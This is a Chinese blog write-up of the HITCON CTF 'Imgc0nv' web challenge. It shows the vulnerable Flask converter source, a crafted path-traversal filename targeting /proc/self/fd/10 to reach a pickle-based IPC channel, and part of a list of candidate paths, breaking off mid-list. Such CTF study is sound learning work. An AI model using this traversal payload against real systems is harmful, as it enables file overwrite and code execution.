@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="hitconCTF，这场比赛还挺难的，一如既往的爆0，什么时候才能成为糕手   分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HitconCTF-Imgc0nv">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="hitconCTF，这场比赛还挺难的，一如既往的爆0，什么时候才能成为糕手   分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-09T09:48:36.000Z">
+<meta property="article:modified_time" content="2025-09-21T13:51:15.560Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="复现">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HitconCTF-Imgc0nv</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/CVE-2020-10796/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/%E5%88%B0%E5%BA%95%E4%BB%80%E4%B9%88%E5%8F%AB%E7%AA%81%E5%8F%98xss/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&text=HitconCTF-Imgc0nv"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&title=HitconCTF-Imgc0nv"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&is_video=false&description=HitconCTF-Imgc0nv"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HitconCTF-Imgc0nv&body=Check out this article: https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&title=HitconCTF-Imgc0nv"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&title=HitconCTF-Imgc0nv"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&title=HitconCTF-Imgc0nv"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&title=HitconCTF-Imgc0nv"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&name=HitconCTF-Imgc0nv&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/HitconCTF-Imgcnv/&t=HitconCTF-Imgc0nv"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text">学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E8%B6%8A%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.</span> <span class="toc-text">跨越目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%80%89%E6%8B%A9"><span class="toc-number">2.2.</span> <span class="toc-text">文件选择</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BMP"><span class="toc-number">2.2.1.</span> <span class="toc-text">BMP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SIG"><span class="toc-number">2.2.2.</span> <span class="toc-text">SIG</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multiprocessing-%E7%9A%84%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%EF%BC%88IPC%EF%BC%89%E6%98%AF%E9%80%9A%E8%BF%87-pickle-%E5%AE%9E%E7%8E%B0-CVE"><span class="toc-number">2.3.</span> <span class="toc-text">multiprocessing 的进程间通信（IPC）是通过 pickle 实现-CVE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">3.</span> <span class="toc-text">后记</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HitconCTF-Imgc0nv
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-09T09:48:36.000Z" class="dt-published" itemprop="datePublished">2025-09-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/%E5%A4%8D%E7%8E%B0/">复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><code>hitconCTF，这场比赛还挺难的，一如既往的爆0，什么时候才能成为糕手  </code></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, g</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_image</span>(<span class="params">args</span>):</span><br><span class="line">    file_data, filename, output_format, temp_dir = args</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> Image.<span class="built_in">open</span>(io.BytesIO(file_data)) <span class="keyword">as</span> img:</span><br><span class="line">            <span class="keyword">if</span> img.mode != <span class="string">&quot;RGB&quot;</span>:</span><br><span class="line">                img = img.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            filename = safe_filename(filename)</span><br><span class="line">            orig_ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            ext = output_format.lower()</span><br><span class="line">            <span class="keyword">if</span> orig_ext:</span><br><span class="line">                out_name = filename.replace(orig_ext, ext, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                out_name = <span class="string">f&quot;<span class="subst">&#123;filename&#125;</span>.<span class="subst">&#123;ext&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">            output_path = os.path.join(temp_dir, out_name)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                img.save(f, <span class="built_in">format</span>=output_format)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> output_path, out_name, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, filename, <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_filename</span>(<span class="params">filename</span>):</span><br><span class="line">    filneame = filename.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 5 MB</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">    g.pool = Pool(processes=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/convert&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_images</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;files&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No files&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    files = request.files.getlist(<span class="string">&#x27;files&#x27;</span>)</span><br><span class="line">    output_format = request.form.get(<span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;&#x27;</span>).upper()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> files <span class="keyword">or</span> <span class="keyword">not</span> output_format:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid input&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> temp_dir:</span><br><span class="line">        file_data = []</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.filename:</span><br><span class="line">                file_data.append(</span><br><span class="line">                    (file.read(), file.filename, output_format, temp_dir)</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_data:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No valid images&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        results = <span class="built_in">list</span>(g.pool.<span class="built_in">map</span>(convert_image, file_data))</span><br><span class="line"></span><br><span class="line">        successful = []</span><br><span class="line">        failed = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> path, name, error <span class="keyword">in</span> results:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> error:</span><br><span class="line">                successful.append((path, name))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                failed.append((name <span class="keyword">or</span> <span class="string">&#x27;unknown&#x27;</span>, error))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> successful:</span><br><span class="line">            error_msg = <span class="string">&quot;All conversions failed. &quot;</span> + \</span><br><span class="line">                <span class="string">&quot;; &quot;</span>.join([<span class="string">f&quot;<span class="subst">&#123;f&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span> <span class="keyword">for</span> f, e <span class="keyword">in</span> failed])</span><br><span class="line">            <span class="keyword">return</span> error_msg, <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        zip_buffer = io.BytesIO()</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_buffer, <span class="string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED) <span class="keyword">as</span> zf:</span><br><span class="line">            <span class="keyword">for</span> path, name <span class="keyword">in</span> successful:</span><br><span class="line">                zf.write(path, name)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> failed:</span><br><span class="line">                summary = <span class="string">f&quot;Conversion Summary:\nSuccessful: <span class="subst">&#123;<span class="built_in">len</span>(successful)&#125;</span>\nFailed: <span class="subst">&#123;<span class="built_in">len</span>(failed)&#125;</span>\n\nFailures:\n&quot;</span></span><br><span class="line">                summary += <span class="string">&quot;\n&quot;</span>.join([<span class="string">f&quot;- <span class="subst">&#123;f&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span> <span class="keyword">for</span> f, e <span class="keyword">in</span> failed])</span><br><span class="line">                zf.writestr(<span class="string">&quot;errors.txt&quot;</span>, summary)</span><br><span class="line"></span><br><span class="line">        zip_buffer.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> send_file(zip_buffer,</span><br><span class="line">                         mimetype=<span class="string">&#x27;application/zip&#x27;</span>,</span><br><span class="line">                         as_attachment=<span class="literal">True</span>,</span><br><span class="line">                         download_name=<span class="string">f&#x27;converted_<span class="subst">&#123;output_format.lower()&#125;</span>.zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure></div>
+<p>这道题是一个图片转换的网站，实现了一个防止目录跨越的函数</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">safe_filename</span>(<span class="params">filename</span>):</span><br><span class="line">    filneame = filename.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br></pre></td></tr></table></figure></div>
+<p>有意思的是注意filneame，并不是filename，所以说，这道题还是要打目录跨越<br>这个时候我瞥见debug开了，还以为可能会是热重载，绕过这两个东西</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(io.BytesIO(file_data)) <span class="keyword">as</span> img:</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                img.save(f, <span class="built_in">format</span>=output_format)</span><br></pre></td></tr></table></figure></div>
+<p>以为往一张图片里塞些python代码即可(),实操每进展，img里的save函数好像都会转为二进制<br>走到这里确实是每招了()</p>
+<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>题解里给了一种很难想到的思路()<br><a target="_blank" rel="noopener" href="https://www.runoob.com/pillow/pillow-image-module.html">关于Pillow的image</a><br>对于这道题，主要学习它选择格式进行存储pickle数据的思路，以及跨越目录的细节，至于关键的pickle反序列化，想在后半段进行CVE复现<br>我们该如何选择这样格式的图片呢?<br>这里面涉及两类，一个是跨越目录的精细调控，另一个是格式选择()</p>
+<h3 id="跨越目录"><a href="#跨越目录" class="headerlink" title="跨越目录"></a>跨越目录</h3><p>关注核心代码，这个逻辑好好懂下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(io.BytesIO(file_data)) <span class="keyword">as</span> img:</span><br><span class="line">        <span class="keyword">if</span> img.mode != <span class="string">&quot;RGB&quot;</span>:</span><br><span class="line">            img = img.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        filename = safe_filename(filename)</span><br><span class="line">        orig_ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        ext = output_format.lower()</span><br><span class="line">        <span class="keyword">if</span> orig_ext:</span><br><span class="line">            out_name = filename.replace(orig_ext, ext, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out_name = <span class="string">f&quot;<span class="subst">&#123;filename&#125;</span>.<span class="subst">&#123;ext&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        output_path = os.path.join(temp_dir, out_name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            img.save(f, <span class="built_in">format</span>=output_format)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> output_path, out_name, <span class="literal">None</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, filename, <span class="built_in">str</span>(e)</span><br></pre></td></tr></table></figure></div>
+<p>注意xxx..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag python里面是无法自动规范的(php就是最好的语言)<br>为什么我会比较这个？注意题目允许我传入修改后的文件后缀，你以为可以自定义了吗?<br>这必须得符合Pillow库的要求，否则会报错<br>而且注意替换逻辑，根据点号后的后缀，从前往后进行替换，这个时候我们可以用已知路径（必须是合法路径）进行绕过，有点牛哇<br>这要求我们找到一个已知路径，里面含有一部分是Pillow库允许的后缀格式，比如  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python3.13/wsgiref/../../../../../../../../../.././proc/self/fd/10</span><br></pre></td></tr></table></figure></div>
+<p>最终目的是替换&#x2F;proc&#x2F;self&#x2F;fd&#x2F;10的内容<br>为啥我们前面要匹配这个路径呢?因为它是sgi<br>所以传入的路径是</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python3.13/w/proc/self/fd/10ref/../../../../../../../../../.././proc/self/fd/10</span><br></pre></td></tr></table></figure></div>
+<p>系统检测到替换成sgi，完美实现目录跨越<br>当然不止是sgi,还有其他的格式  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;im&quot;: [</span><br><span class="line">        &quot;/usr/local/include/python3.13/internal/mimalloc&quot;, </span><br><span class="line">        &quot;/sys/kernel/slab/btrfs_prelim_ref&quot;,</span><br><span class="line">        &quot;/sys/devices/virtual/net/lo/queues/tx-0/byte_queue_limits&quot;,</span><br><span class="line">        &quot;/sys/bus/platform/drivers/alarmtimer&quot;,</span><br><span class="line">        &quot;/etc/systemd/system/timers.target.wants&quot;,</span><br><span class="line">        &quot;/sys/module/libnvdimm&quot;,</span><br><span class="line">        &quot;/usr/local/lib/python3.13/importlib&quot;,</span><br><span class="line">        &quot;/usr/local/lib/python3.13/email/mime&quot;,</span><br><span class="line">        &quot;/sys/kernel/slab/posix_timers_cache&quot;,</span><br><span class="line">        &quot;/usr/local/include/python3.13/internal/mimalloc/mimalloc&quot;,</span><br><span class="line">        &quot;/sys/devices/pnp0/00:00/rtc/rtc0/alarmtimer.0.auto&quot;,</span><br><span class="line">        &quot;/usr/share/doc/libpam-runtime&quot;,</span><br><span class="line">        &quot;/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants&quot;,</span><br><span class="line">        &quot;/etc/security/limits.d&quot;,</span><br><span class="line">        &quot;/sys/devices/virtual/net/eth0/queues/tx-0/byte_queue_limits&quot;,</span><br><span class="line">        